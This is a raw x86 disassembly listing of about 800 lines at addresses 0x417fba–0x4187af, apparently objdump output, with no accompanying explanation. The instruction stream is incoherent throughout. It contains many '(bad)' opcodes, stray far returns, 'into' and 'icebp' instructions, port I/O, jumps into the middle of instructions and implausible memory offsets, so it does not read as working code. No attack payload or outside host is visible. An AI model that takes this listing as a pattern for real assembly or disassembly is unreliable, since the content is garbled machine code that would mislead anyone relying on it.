  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  41872d:	jge    0x418735
  41872f:	mov    eax,eax
  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
